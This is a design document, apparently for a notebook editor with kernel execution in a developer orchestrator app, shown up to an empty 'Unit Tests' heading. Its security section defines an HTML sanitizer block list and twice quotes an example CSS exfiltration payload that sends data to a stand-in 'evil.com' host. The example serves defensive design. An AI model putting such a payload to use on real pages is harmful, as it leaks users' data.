**Working directory:** The kernel is started with `cwd` set to the session's `work_dir`. This means `import mymodule` and `open('data.csv')` work relative to the project root, matching user expectations.

**Kernel shutdown:** Kernels are shut down when:
- User clicks "Shutdown Kernel" or closes the notebook tab
- The session is deleted
- The orchestrator shuts down (`shutdown_all()` in the app lifespan hook)
- The kernel dies unexpectedly (detected via heartbeat, status set to 'dead', frontend shows restart option)

### Backend: REST Endpoints (`orchestrator/api/routes/kernel.py`)

| Endpoint | Method | Purpose |
|---|---|---|
| `/sessions/{id}/kernel/specs` | `GET` | List available kernelspecs (from `jupyter kernelspec list`) |
| `/sessions/{id}/kernel/start` | `POST` | Start a kernel for a notebook (`{ notebook_path, kernel_name }`) |
| `/sessions/{id}/kernel/interrupt` | `POST` | Interrupt running execution |
| `/sessions/{id}/kernel/restart` | `POST` | Restart kernel (preserves connection, resets state) |
| `/sessions/{id}/kernel/shutdown` | `POST` | Shut down kernel and release resources |
| `/sessions/{id}/kernel/status` | `GET` | Get kernel status (`{ status, kernel_name, execution_count }`) |

### Backend: WebSocket Handler (`/ws/kernel/{session_id}`)

A new WebSocket endpoint following the same pattern as `/ws/terminal/{id}`. Bidirectional communication:

**Client → Server messages (JSON text frames):**
```typescript
// Execute a cell
{ type: 'execute', cell_id: string, code: string }

// Interrupt execution
{ type: 'interrupt' }
```

**Server → Client messages (JSON text frames):**
```typescript
// Kernel status change
{ type: 'status', status: 'idle' | 'busy' | 'starting' | 'dead' }

// Stream output (stdout/stderr)
{ type: 'stream', cell_id: string, name: 'stdout' | 'stderr', text: string }

// Rich output (display_data or execute_result)
{ type: 'display', cell_id: string, data: Record<string, string>, metadata: Record<string, unknown> }

// Error output
{ type: 'error', cell_id: string, ename: string, evalue: string, traceback: string[] }

// Execution complete
{ type: 'execute_complete', cell_id: string, execution_count: number }

// Clear output (from display_data with transient.display_id)
{ type: 'clear_output', cell_id: string, wait: boolean }
```

### Frontend: Execution State

The `NotebookEditorState` gains kernel-related fields:

```typescript
interface NotebookEditorState {
  // ... existing fields ...

  // Kernel state
  kernelStatus: 'none' | 'starting' | 'idle' | 'busy' | 'dead'
  kernelName: string | null
  availableKernels: KernelSpec[]       // from /kernel/specs
  executingCellIds: Set<string>        // cells currently running or queued
  cellExecutionQueue: string[]         // ordered queue of cell IDs to execute
}
```

New actions:
```typescript
type NotebookAction =
  | // ... existing actions ...
  | { type: 'START_KERNEL'; kernelName: string }
  | { type: 'KERNEL_STATUS_CHANGED'; status: string }
  | { type: 'EXECUTE_CELL'; cellId: string }
  | { type: 'EXECUTE_ALL' }
  | { type: 'EXECUTE_ABOVE'; cellId: string }
  | { type: 'EXECUTE_BELOW'; cellId: string }
  | { type: 'INTERRUPT_KERNEL' }
  | { type: 'RESTART_KERNEL' }
  | { type: 'STREAM_OUTPUT'; cellId: string; name: string; text: string }
  | { type: 'DISPLAY_OUTPUT'; cellId: string; data: Record<string, string>; metadata: Record<string, unknown> }
  | { type: 'ERROR_OUTPUT'; cellId: string; ename: string; evalue: string; traceback: string[] }
  | { type: 'EXECUTE_COMPLETE'; cellId: string; executionCount: number }
  | { type: 'CLEAR_CELL_OUTPUTS'; cellId: string }
```

### Frontend: Execution Flow

**Single cell execution (Ctrl+Enter):**
1. Save current cell source from Monaco (if in edit mode)
2. Clear existing outputs for this cell
3. Set execution count to `[*]` (running indicator)
4. Add cell to `executingCellIds`
5. Send `{ type: 'execute', cell_id, code }` over WebSocket
6. As `stream`/`display`/`error` messages arrive, append to cell outputs (live streaming)
7. On `execute_complete`: update `execution_count`, remove from `executingCellIds`

**Shift+Enter (run and advance):**
Same as above, then move selection to next cell (or insert new code cell if at end).

**Run All:**
Build ordered queue of all code cells. Execute sequentially — send next cell only after previous completes. Skip markdown/raw cells. Any error stops the queue (matching Jupyter behavior) unless user opts to continue.

**Interrupt (I,I or toolbar button):**
Send `{ type: 'interrupt' }` over WebSocket. Backend calls `kernel_manager.interrupt_kernel()` which sends SIGINT to the kernel process. The kernel replies with a `KeyboardInterrupt` error output. Frontend clears `executingCellIds` and dequeues pending cells.

**Restart kernel (0,0 or toolbar button):**
1. Show confirmation via `<ConfirmPopover>`: "Restart kernel? All variables will be lost."
2. On confirm: backend calls `kernel_manager.restart_kernel()`
3. Frontend resets: all `execution_count` → null, clear `executingCellIds`, kernel status → 'starting' then 'idle'
4. Outputs are **preserved** (matching VS Code behavior — restart doesn't clear outputs)

### Frontend: Output Streaming UX

When a cell is executing:
- Execution count shows `[*]` with a subtle pulsing animation
- The gutter run button changes to a stop square
- Outputs appear incrementally as they stream in:
  - stdout/stderr: text appended character by character (or line by line, depending on kernel flush behavior)
  - Images: appear when the full base64 data arrives (display_data is atomic)
  - Errors: traceback rendered with ANSI colors as soon as it arrives
- If the cell already had outputs (from a previous run or from the `.ipynb` file), they are **cleared** when execution starts (matching Jupyter behavior)

### Kernel Auto-Start

When the user first clicks a run button or presses Ctrl+Enter:
1. If no kernel is running, auto-start one using the `kernelspec` from notebook metadata
2. Show kernel status as "starting" (orange pill in toolbar)
3. Once idle, execute the queued cell
4. If `jupyter` is not found on PATH: show error "Jupyter is not installed. Run `pip install ipykernel` to enable execution."

### Remote Kernel Support

For remote sessions (rdev), the kernel must run on the remote host where the notebook files and data live.

**Approach:** RWS spawns a **separate helper subprocess** for kernel management. The RWS daemon itself remains stdlib-only (critical invariant — it is base64-encoded and sent to remote hosts, must not import third-party packages).

**Architecture:**

```
RWS daemon (stdlib-only)
  │
  │  kernel_start action
  │  ─────────────────▸  subprocess: python -c "from orchestrator_kernel_helper import ..."
  │                       │
  │                       │  jupyter_client.KernelManager.start_kernel()
  │                       │  ──────────────────────────────────────▸  Kernel Process
  │                       │
  │  kernel_execute        │
  │  ─────────────────▸   │  ZMQ execute_request
  │                       │  ──────────────────────────────────────▸
  │                       │
  │  ◂── kernel output    │  ◂── ZMQ iopub messages
  │      (JSON-lines)     │
```

**How it works:**

1. RWS receives a `kernel_start` action over its TCP connection
2. RWS checks `shutil.which('jupyter')` — if not found, returns `{"error": "jupyter not installed", "install_hint": "pip install jupyter_client ipykernel"}`
3. If available, RWS spawns a long-lived helper subprocess: `python -m orchestrator_kernel_bridge`
4. The kernel bridge script (deployed alongside the daemon, or inlined as a second base64 payload) uses `jupyter_client` to manage the kernel lifecycle
5. RWS communicates with the bridge via stdin/stdout JSON-lines (same protocol as RWS↔orchestrator)
6. Kernel output messages are forwarded through: kernel → ZMQ → bridge → RWS → TCP → orchestrator → WebSocket → frontend
7. On `kernel_shutdown`, RWS sends SIGTERM to the bridge subprocess, which gracefully shuts down the kernel

**Why a subprocess instead of inline imports:**
- **Preserves the stdlib-only invariant** — the RWS daemon script (`_rws_daemon.py`) has a hard rule: no third-party imports. Breaking this would require native packages (`pyzmq`) to be pre-installed just to start the daemon, even when no kernel features are used.
- **Clean failure mode** — if `jupyter_client` isn't installed, the subprocess fails to start and RWS returns a clear error. The daemon itself is unaffected.
- **Process isolation** — a kernel crash or `pyzmq` segfault can't take down the RWS daemon (which also manages PTY sessions and file operations).

This avoids tunneling ZMQ ports (which uses 5 ports per kernel — stdin, shell, iopub, control, heartbeat). The RWS acts as a single-port bridge.

**Requirement:** `jupyter_client` and `ipykernel` (or the relevant kernel) must be installed on the remote host by the user. RWS detects availability via `shutil.which('jupyter')` and reports it in its health/capability response. The orchestrator's `KernelPool` checks this capability before attempting remote kernel operations.

### Kernel Security Considerations

- **Code execution is inherently dangerous** — the kernel runs arbitrary code with the user's permissions. This is expected and matches Jupyter/VS Code behavior. No sandboxing is applied.
- **No auto-execution** — opening a `.ipynb` file never runs code. Execution requires an explicit user action (Ctrl+Enter, Shift+Enter, or clicking the Run button). This prevents malicious notebooks from executing on open.
- **Shell injection: N/A** — we never construct shell commands with kernel inputs. `jupyter_client` handles all kernel subprocess management.
- **Kernel name validation** — the `kernel_name` parameter in `POST /kernel/start` is validated against the output of `jupyter kernelspec list` before being passed to `jupyter_client`. Any unrecognized kernel name is rejected with a 400 response. This prevents path traversal or injection into the kernel spec lookup.
- **Kernel subprocess isolation:** Local kernels run as child processes of the backend. Remote kernels run as children of the RWS kernel bridge subprocess (not the RWS daemon itself — see Remote Kernel Support). All inherit the user's environment. On shutdown, we send SIGTERM then SIGKILL after 5s timeout.
- **Resource limits:** No CPU/memory limits on kernels (same as running `python` locally). The 500-cell cap limits the scope of "Run All" operations.
- **Authentication:** Kernel WebSocket requires the same session authentication as terminal WebSocket — it's only accessible from the local machine (CORS-locked origins).
- **Port allocation:** `jupyter_client` selects random available ports for ZMQ channels. These ports are only bound to localhost (not exposed externally).
- **Kernel dependency isolation** — `jupyter_client` and `ipykernel` are not bundled with the orchestrator. They must be installed independently on each worker host. The RWS daemon remains stdlib-only; kernel management is delegated to a subprocess. A missing or broken kernel installation cannot affect the orchestrator's core functionality.

---

## Integration with FileViewer and Tab System

### Changes to `FileViewer.tsx`

Add notebook detection:

```typescript
function isNotebookFile(path: string): boolean {
  return path.endsWith('.ipynb')
}
```

In the content area, add a branch:

```tsx
: isNotebookFile(activeTab.path) ? (
  <NotebookEditor
    content={activeTab.currentContent ?? ''}
    onContentChange={(json) => onContentChange(activeTab.path, json)}
    sessionId={sessionId}
  />
) : (
  <div className="fe-viewer__monaco">
    <Editor ... />
  </div>
)
```

The tab bar shows the same toggle button as markdown files — but for notebooks, it switches between **Notebook view** (cell-based editor) and **JSON view** (raw JSON in Monaco).

### Changes to `useEditorTabs.ts`

Add `.ipynb` to `EXT_LANGUAGE`:
```typescript
'.ipynb': 'jupyter',
```

**Dirty state:** The `NotebookEditor` component calls `onContentChange` with the re-serialized JSON whenever the notebook state changes (cell edits, structural changes). This integrates with the existing tab dirty-state tracking — the tab system thinks it's editing a JSON text file, but the content happens to be managed by the notebook editor.

This means **save uses the existing mechanism**: `Ctrl+S` triggers `onSave(path)` in the tab system, which PUTs the `currentContent` (serialized JSON) to the backend. No new save endpoint needed.

### Changes to backend `files.py`

Add to `_LANGUAGE_MAP`:
```python
".ipynb": "jupyter",
```

---

## Security

### HTML Output Sanitization

Notebook HTML outputs can contain arbitrary HTML from libraries like pandas (`DataFrame.to_html()`), matplotlib, etc. We MUST sanitize before rendering.

**Strategy: DOMPurify with restrictive config + CSS `url()` stripping.**

```typescript
import DOMPurify from 'dompurify'

const NOTEBOOK_PURIFY_CONFIG: DOMPurify.Config = {
  ALLOWED_TAGS: [
    'p', 'br', 'hr', 'div', 'span', 'pre', 'code',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'blockquote', 'em', 'strong', 'b', 'i', 'u', 's', 'del', 'sub', 'sup',
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col',
    'img',
    'details', 'summary', 'figure', 'figcaption',
  ],
  ALLOWED_ATTR: [
    'class', 'id', 'style', 'title', 'alt', 'src', 'width', 'height',
    'colspan', 'rowspan', 'scope', 'align', 'valign', 'border',
  ],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'a', 'link', 'meta', 'base'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
}

// Strip url() from style attributes to prevent CSS data exfiltration
// (e.g., `background-image: url(https://evil.com/steal?data=...)`)
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (data.attrName === 'style' && data.attrValue) {
    data.attrValue = data.attrValue.replace(/url\s*\([^)]*\)/gi, 'url()')
  }
})
```

**Why this is safe:**
- No `<script>`, `<iframe>`, event handlers, `<a>` tags
- `style` allowed (needed for pandas DataFrames) but `url()` values are stripped to prevent CSS-based data exfiltration (`background-image: url(https://evil.com/steal?data=...)`) and UI redressing
- `<img src>` allowed but DOMPurify blocks `javascript:` URIs

### SVG Output Sandboxing

SVG is a complex attack surface — even after DOMPurify sanitization, SVG can contain `<use href="...">` for SSRF-like behavior, CSS `@import` for data exfiltration, and `<foreignObject>` for HTML injection.

**Strategy: Render SVGs as `<img>` data URIs instead of inline HTML.** This fully sandboxes SVG — the browser's image decoder strips all scripting, external resource loading, and interactive elements.

```typescript
// In NotebookOutput.tsx — SVG rendering
if (mimeType === 'image/svg+xml') {
  const svgData = btoa(unescape(encodeURIComponent(content)))
  return <img src={`data:image/svg+xml;base64,${svgData}`} alt="SVG output" />
}
```

**Why `<img>` and not inline DOMPurify:** DOMPurify cannot fully neutralize SVG. SVG supports `<use href>`, `<animate>`, CSS `@import`, `xlink:href`, and other vectors that would require a constantly-updated blocklist. The `<img>` tag renders SVG through the browser's image pipeline, which by spec blocks all scripting, external loads, and interactivity. Zero maintenance burden.

### CSP Compliance

No `unsafe-eval`. Uses `dangerouslySetInnerHTML` only with DOMPurify-sanitized output. No external resource loading from outputs. SVG rendered via `<img>` data URIs, not inline.

### Base64 Image Safety

Data URIs in `<img>` are safe (decoded as image, not HTML/JS). MIME type validated against allowlist (`image/png`, `image/jpeg`, `image/gif`, `image/svg+xml`). SVG is always rendered via `<img>` (never inline), so even malicious SVG is sandboxed.

### Input Validation

- `JSON.parse()` with error handling (malformed JSON → error message)
- Validates `nbformat >= 4`, `cells` is array, each cell has `cell_type` and `source`
- Skips invalid cells with warning, doesn't throw
- 500-cell cap prevents DOM exhaustion

### Serialization Safety

When saving, the serializer produces valid JSON from our typed data model — no user-controlled strings are interpolated into code. The output goes through `JSON.stringify()` which handles escaping.

### Kernel Name Validation

The `kernel_name` parameter in `POST /kernel/start` must be validated against the known kernelspec list (from `jupyter kernelspec list`) before being passed to `jupyter_client`. This prevents path traversal or injection into the kernel spec lookup. Reject any `kernel_name` not present in the discovered specs with a 400 response.

---

## Performance

### Estimated Costs

| Item | Cost | Mitigation |
|---|---|---|
| Parsing 5MB notebook JSON | ~50ms | One-time on tab open; `useMemo` |
| Rendering 100 code cells (static highlight) | ~200ms total | Lazy rendering: only viewport cells |
| Single Monaco editor mount/unmount | ~20ms | One instance, moved between cells |
| DOMPurify sanitization per HTML output | ~5ms | Only for `text/html` MIME type |
| Notebook serialization on save | ~30ms | Only on Ctrl+S, not on every keystroke |
| Kernel startup (cold) | ~2-5s | One-time; auto-start on first run; show "Starting..." status |
| Kernel startup (warm / restart) | ~1-2s | Faster since Python is already cached by OS |
| Execute simple cell (`print("hi")`) | ~50-100ms | Dominated by ZMQ round-trip, not computation |
| WebSocket output message overhead | <1ms per message | JSON text frames, same as terminal WS |
| Total initial render (100-cell notebook) | ~100ms | 60fps target maintained |

### The Single Monaco Instance Advantage

| Approach | Memory for 50-cell notebook | Init time |
|---|---|---|
| One Monaco per cell | ~100MB (50 × 2MB) | ~5s (50 × 100ms) |
| Single shared Monaco | ~2MB (1 instance) | ~100ms (1 instance) |
| **Savings** | **98% reduction** | **98% reduction** |

### Lazy Rendering (IntersectionObserver)

Cells outside the viewport render as placeholder divs with estimated heights. An `IntersectionObserver` (200px rootMargin) triggers actual rendering when cells scroll into view. Once rendered, cells stay in DOM (they're cheap — just `<pre>` and `<div>` elements).

**Why not full virtual scrolling?**
- Variable-height cells (outputs!) make height pre-computation impossible
- Breaks browser Ctrl+F (find-in-page)
- IntersectionObserver gives 90% of the benefit at 5% of the complexity
- 500-cell cap prevents DOM exhaustion for extreme cases

### Content Change Debouncing

When the user types in Monaco, we debounce content updates (100ms) before updating the notebook state. We do NOT re-serialize to JSON on every keystroke — serialization only happens on save (Ctrl+S).

The dirty flag is set immediately on first edit. The `onContentChange` callback to the tab system is debounced (300ms) with the serialized JSON, so the tab system's dirty indicator updates promptly but we don't waste CPU serializing on every keystroke.

### Memory Considerations

- 1 Monaco instance (~2MB) regardless of notebook size
- Static cells: `<pre>` elements with highlighted HTML (~1KB per cell)
- Base64 images stored once in parsed notebook, referenced by data URI
- 5MB notebook JSON + ~2x parsed overhead = ~15MB total
- Undo stack: 100 operations max, each stores a cell snapshot (~1KB) = ~100KB
- Kernel process: ~50-100MB per Python kernel (standard Python + ipykernel overhead). User-code allocations are on top of this. Managed by OS, not by us.
- WebSocket connection: negligible overhead (~1 connection per open notebook)

---

## Styling

### Design Tokens

```css
/* Cell container */
.nb-cell {
  position: relative;
  margin: 0 0 2px 0;
  border-radius: 6px;
  background: var(--surface);
  border: 1px solid transparent;
  border-left: 3px solid transparent;
  transition: border-color 100ms ease;
}

/* Command mode — selected cell */
.nb-cell--selected {
  border-left-color: var(--accent);
}

/* Edit mode — focused cell */
.nb-cell--editing {
  border-left-color: var(--accent);
}
.nb-cell--editing .nb-cell__editor-slot {
  outline: 1px solid var(--accent-muted);
  border-radius: 4px;
}

/* Code cell gutter (execution count) */
.nb-cell__gutter {
  width: 48px;
  color: var(--text-muted);
  font-family: var(--font-mono);
  font-size: 12px;
  text-align: right;
  padding: 8px 8px 8px 0;
  flex-shrink: 0;
  user-select: none;
  cursor: pointer;  /* click to select in command mode */
}

/* Code cell source (static — unfocused) */
.nb-cell__source-static {
  font-family: var(--font-mono);
  font-size: 12px;
  line-height: 19px;           /* match Monaco exactly */
  padding: 8px 12px 4px 12px;  /* match Monaco padding */
  overflow-x: auto;
  cursor: text;                /* click to enter edit mode */
}

/* Editor slot (where Monaco mounts) */
.nb-cell__editor-slot {
  min-height: 19px;  /* at least one line */
}

/* Output area */
.nb-cell__outputs {
  padding: 8px 12px 8px 60px;  /* indent to align with source (past gutter) */
  border-top: 1px solid var(--border-subtle);
  background: var(--bg);
}

/* Markdown cell (preview mode) */
.nb-cell--markdown .nb-cell__preview {
  padding: 12px 16px;
  border-left: 2px solid var(--accent-muted);
  cursor: text;  /* click to enter edit mode */
}

/* Cell hover toolbar */
.nb-cell__toolbar {
  position: absolute;
  top: 4px;
  right: 8px;
  display: flex;
  gap: 4px;
  opacity: 0;
  transition: opacity 150ms ease;
}
.nb-cell:hover .nb-cell__toolbar {
  opacity: 1;
}

/* Between-cell insertion bar */
.nb-insert-bar {
  position: relative;
  height: 16px;
  display: flex;
  align-items: center;
  opacity: 0;
  transition: opacity 150ms ease;
}
.nb-insert-bar:hover {
  opacity: 1;
}

/* Metadata/toolbar bar */
.nb-header {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 6px 12px;
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  font-size: 12px;
  color: var(--text-secondary);
}
```

### Theme Support

Inherits dark/light automatically via CSS variables. Monaco uses existing `cool-dark`/`cool-light` themes from `FileViewer.tsx`. ANSI colors use terminal variables from xterm.js.

---

## Error Handling

| Scenario | Behavior |
|---|---|
| Invalid JSON | Show error + option to view as raw JSON |
| `nbformat` < 4 | Show error: "Only nbformat v4+ supported" + raw JSON option |
| No cells | Show metadata bar + "This notebook has no cells." + insert bar |
| Malformed cell | Skip cell, show placeholder: "Cell {n} could not be rendered." |
| Unknown output MIME type | Fall back to `text/plain`; if none, show "Unsupported output type" |
| Truncated file (>5MB) | Warning banner: "Notebook was truncated. Some cells may be missing." |
| Base64 decode failure | Placeholder: "Image could not be rendered." |
| DOMPurify strips all content | "HTML output was blocked by security policy." |
| Save failure (conflict/network) | Existing tab system handles conflict banners and error display |
| Monaco mount failure | Fall back to static view for that cell; show subtle error indicator |

---

## Implementation Plan

### Phase 1 — Core Rendering + Static View

**Estimated effort: 3-4 days**

1. **`notebookTypes.ts`** — Type definitions
2. **`notebookParser.ts`** + tests — Parse `.ipynb` JSON
3. **`AnsiRenderer.tsx`** + tests — ANSI escape code parser
4. **`NotebookOutput.tsx`** + tests — Output renderer (text/plain with ANSI, images, errors, HTML via DOMPurify)
5. **`NotebookCell.tsx`** — Cell renderer (static mode only — no Monaco yet)
   - Code cells with `highlightCode()` static rendering
   - Markdown cells with `<Markdown>` preview
   - Raw cells
   - Cell collapse/expand
6. **`NotebookEditor.tsx`** — Main container with metadata bar, cell list, lazy rendering
7. **Integration** — Wire into FileViewer, add language mappings
8. **Install DOMPurify** — `npm install dompurify @types/dompurify` (adds ~30KB min+gzip to bundle; exists in `node_modules` as a transitive dep of monaco-editor but is not currently imported by our code)

At this point the notebook displays correctly but is read-only.

### Phase 2 — Monaco Editing + Cell Modes

**Estimated effort: 3-4 days**

1. **Single Monaco lifecycle** — Mount/unmount the shared Monaco instance into cells
   - Editor container as a floating div, moved between cell editor slots
   - Auto-height to fit content
   - Font metric matching (12px/19px) between Monaco and static `<pre>`
   - Content sync on focus change
2. **Command mode / Edit mode** — Enter/Escape transitions, visual indicators
3. **Keyboard shortcuts** — Cell navigation (J/K/arrows), mode switching (Enter/Escape)
4. **Markdown edit mode** — Click markdown cell → Monaco with raw markdown, Escape → re-render preview
5. **Cell toolbar on hover** — Delete, type toggle, more menu

### Phase 3 — Cell Manipulation + Save

**Estimated effort: 2-3 days**

1. **Cell insertion** — A/B shortcuts, between-cell "+" bar, toolbar buttons
2. **Cell deletion** — DD / Delete shortcut, toolbar button
3. **Cell movement** — Alt+Up/Down
4. **Cell type switching** — M/Y shortcuts
5. **Split / Merge cells** — Via toolbar "More" menu
6. **`notebookSerializer.ts`** + tests — Serialize back to `.ipynb` with round-trip fidelity
7. **`notebookUndoStack.ts`** + tests — Structural undo/redo
8. **Save integration** — `onContentChange` with debounced serialization, Ctrl+S via tab system
9. **JSON toggle** — Switch between cell editor and raw JSON in Monaco (bidirectional)

### Phase 4 — Polish

**Estimated effort: 1-2 days**

1. **Loading skeleton** while notebook JSON is fetched
2. **Collapse all / Expand all** toolbar buttons
3. **Line number toggle** (L shortcut)
4. **Output collapse toggle** (O shortcut)
5. **Edge cases** — Empty notebooks, single-cell notebooks, very long cells, cells with no outputs
6. **Accessibility** — ARIA roles on cell list, toolbar buttons, focus management

### Phase 5 — Cell Execution (Local Kernels)

**Estimated effort: 4-5 days**

**Prerequisite:** `jupyter_client` and `ipykernel` must be installed on the local host by the user. These are NOT bundled — the orchestrator detects them at runtime via `try: import jupyter_client`.

1. **`orchestrator/kernel/manager.py`** — `KernelPool` with start/stop/restart/interrupt
   - Runtime detection: `try: import jupyter_client` at module level; `is_kernel_support_available()` check
   - Uses `jupyter_client.KernelManager` for subprocess management (only when available)
   - Validates `kernel_name` against `jupyter kernelspec list` before passing to `jupyter_client`
   - Async iopub reader task forwards messages to WebSocket clients
   - Heartbeat monitoring detects dead kernels
   - Graceful shutdown on app exit
   - Tests: mock `jupyter_client`, test lifecycle state transitions, test graceful fallback when missing
2. **`orchestrator/api/routes/kernel.py`** — REST endpoints for specs/start/stop/restart/status
   - Kernelspec detection via `jupyter kernelspec list`
   - When `jupyter_client` is not installed: return `{"available": false, "install_hint": "pip install jupyter_client ipykernel"}`
3. **`/ws/kernel/{session_id}` WebSocket handler** — Execute requests, stream outputs
   - JSON text frames, same auth as `/ws/terminal/{id}`
   - Maps cell_id to iopub parent_msg_id for routing outputs to correct cells
   - Must integrate with activity tracking (`ws_terminal.py:record_user_input`) — kernel execution counts as user activity
4. **Frontend `useKernel` hook** — WebSocket connection, message dispatch, kernel status tracking
5. **Frontend execution UI** — Run buttons (gutter + toolbar), kernel status pill, Shift+Enter / Ctrl+Enter / Alt+Enter, execution count `[*]` animation, output streaming
6. **Execution keyboard shortcuts** — Ctrl+Enter, Shift+Enter, Alt+Enter, I,I (interrupt), 0,0 (restart)
7. **Auto-start** — First run triggers kernel start; detect missing jupyter gracefully with per-host install banner

### Phase 6 — Remote Kernel Support

**Estimated effort: 3-4 days**

**Prerequisite:** `jupyter_client` and `ipykernel` must be installed on the remote host by the user. The RWS daemon itself remains stdlib-only.

1. **RWS kernel bridge subprocess** — Deploy a separate Python script (`orchestrator_kernel_bridge`) alongside the daemon. RWS spawns it as a subprocess for kernel management. Communication via stdin/stdout JSON-lines. The daemon itself does NOT import `jupyter_client`.
2. **RWS kernel actions** — Add `kernel_start`/`execute`/`interrupt`/`shutdown` action handlers in the daemon that delegate to the bridge subprocess
3. **Backend delegation** — `KernelPool` detects remote sessions, routes through RWS instead of local `jupyter_client`
4. **Kernel availability detection** — RWS checks `shutil.which('jupyter')` and reports capability in health response. Show per-host install instructions: "Run `pip install jupyter_client ipykernel` on {hostname} to enable execution."
5. **Tests** — Mock RWS communication, test remote kernel lifecycle, test graceful failure when jupyter not installed on remote host

### Phase 7 — Polish & Future

**Estimated effort: 1-2 days**

1. **Run All / Run Above / Run Below** — Execution queue with sequential ordering
2. **Clear All Outputs** — Toolbar button
3. **Kernel restart confirmation** — `<ConfirmPopover>` warning about variable loss
4. **Dead kernel recovery** — Auto-detect, show "Kernel died. Restart?" banner

### Future Enhancements (Out of Scope)

- **KaTeX** — Math rendering in markdown cells
- **Multi-cell selection** — Shift+click/Shift+J/K range selection
- **Cell drag-and-drop** — Reorder via mouse drag on gutter
- **Plotly/Vega** — Rich interactive outputs (requires widget comm channel + CDN JS)
- **ipywidgets** — Interactive widgets (requires full comm protocol implementation)
- **Notebook diffing** — Side-by-side comparison with git
- **Cell search** — Ctrl+F across all cells
- **Variable explorer** — Inspect active kernel variables

---

## Regression Mitigation Strategy

The notebook editor integrates with several existing systems (file viewer, tab state, keyboard handling, Monaco lifecycle). This section documents how to avoid breaking existing functionality.

### Keyboard Isolation

The notebook's single-key command-mode shortcuts (J/K/A/B/D/M/Y/Z/Enter/Escape) are the highest regression risk because the app already has global `keydown` handlers on `document`:

- `WorkerDetail.tsx` — Ctrl+S (save), Ctrl+W (close tab), Ctrl+Shift+E (toggle explorer)
- `WorkerWorkspace.tsx` — Cmd+Shift+[/] (tab switch), Cmd+\ (toggle split)
- `FileExplorerPanel.tsx` — Arrow keys, Enter, `/` (open filter), Escape

**Required implementation rules:**

1. The notebook `onKeyDown` handler is attached to the notebook container `<div>`, NOT to `document`
2. All consumed keys call `event.stopPropagation()` to prevent bubbling to document-level handlers
3. Command-mode keys only activate when `document.activeElement` is inside the notebook container (check via `containerRef.current?.contains(document.activeElement)`)
4. In edit mode (Monaco active), only Escape, Ctrl+S, and execution shortcuts (Ctrl+Enter, Shift+Enter, Alt+Enter) are intercepted — everything else goes to Monaco
5. Double-tap shortcuts (DD, II, 00) must verify the first keypress target is within the notebook before starting the timer window

### Monaco Multi-Instance Safety

This is the first time the app will have two concurrent Monaco editor instances (FileViewer's + NotebookEditor's). Both share the global `monaco` namespace from `loader.init()`.

**Required implementation rules:**

1. Each editor uses its own `ITextModel` instance — never reuse models across FileViewer and NotebookEditor
2. Theme definitions (`cool-dark`, `cool-light`) are global and shared — this is fine, do not define duplicate themes
3. When the notebook editor calls `model.setValue()` during cell focus changes, it triggers `onDidChangeModelContent`. Guard with an `isSettingValue` ref flag to distinguish programmatic updates from user typing:
   ```typescript
   const isSettingValue = useRef(false)
   // When changing cells:
   isSettingValue.current = true
   model.setValue(newCellSource)
   isSettingValue.current = false
   // In onChange handler:
   editor.onDidChangeModelContent(() => {
     if (isSettingValue.current) return
     dispatch({ type: 'UPDATE_CELL_SOURCE', ... })
   })
   ```
4. When a `.ipynb` tab is not active (user switched to a `.py` tab), the notebook's Monaco instance must not call `editor.layout()` or `editor.focus()` — these would interfere with the active editor

### External Change Detection for Notebooks

The tab system polls file mtime every 3s (`useEditorTabs.ts:275-327`). For clean tabs, it silently reloads content via `fetchTabContent`. This is **dangerous for notebooks** because:

- `fetchTabContent` replaces `originalContent` AND `currentContent` in the tab state
- The NotebookEditor maintains parsed cell state in React state, independent of `currentContent`
- A silent reload would desync the NotebookEditor's state from the tab's content

**Required implementation rules:**

1. For `.ipynb` tabs, mtime changes must **never** trigger a silent `fetchTabContent` reload
2. Instead, mtime changes set `externallyChanged: true`, showing the "file changed on disk" banner
3. The NotebookEditor handles the "reload" action by re-parsing the new JSON and merging cell-level changes (or replacing entirely if the user confirms)
4. While a kernel is running for this notebook, consider suppressing mtime polling entirely (kernel execution may write outputs to the file)

### Round-Trip Serializer Fidelity

The tab system detects dirty state via `originalContent !== currentContent` (string equality). For notebooks, `currentContent` is the serialized JSON from `notebookSerializer.ts`. If the serializer produces different output than the original (different whitespace, key ordering), the tab shows dirty immediately on open.

**Required implementation rules:**

1. The serializer must detect and reproduce the original file's indentation (1 space, 2 space, 4 space, tab)
2. JSON keys must be sorted alphabetically (minimizes diff noise and ensures deterministic output)
3. Source line splitting must produce byte-identical output for unmodified cells
4. **Critical test:** parse an unmodified notebook → serialize → compare with original bytes. Any difference is a bug. Run this against 10+ real-world notebooks (pandas docs, scikit-learn, matplotlib gallery).

### CSS Output Scoping

Notebook HTML outputs (from pandas, matplotlib, seaborn) contain their own CSS class names that could collide with app styles. App CSS could also bleed into output rendering.

**Required implementation rules:**

1. Wrap all notebook HTML output in a container with CSS isolation:
   ```css
   .nb-cell__outputs__html {
     all: initial;          /* reset inherited app styles */
     font-family: inherit;  /* restore base font */
     font-size: inherit;
     color: inherit;
   }
   ```
2. Notebook CSS classes use the `nb-` prefix exclusively — verify no collisions with `fe-` (file explorer), `monaco-` (editor), or `xterm-` (terminal) prefixes

### Required Regression Test Suite

Before shipping each phase, run these integration tests:

**Phase 1-2 (rendering + editing):**
- Open `.py` tab → open `.ipynb` tab → switch between them 10× rapidly → verify no Monaco crashes, no language bleed, no stale content
- Focus file explorer → press J/K → verify tree navigation works (not notebook)
- Focus notebook cell → press J/K → verify cell navigation works (not tree)
- Focus terminal → type J/K → verify terminal receives input (not intercepted)
- Open `.ipynb` → make no edits → verify dirty flag is false
- Open `.ipynb` → edit one cell → undo → verify dirty flag returns to false
- Modify `.ipynb` on disk while open in editor → verify external change banner appears (no silent reload)

**Phase 5 (kernel execution):**
- Open notebook + terminal side by side → execute cell → verify terminal remains responsive
- Execute cell → close notebook tab → verify kernel is shut down (no orphan process)
- Disconnect network (remote session) → verify kernel shutdown is graceful, no zombie processes
- Open notebook → click Run without jupyter installed → verify install banner appears, no crash

---

## Testing Strategy

### Unit Tests

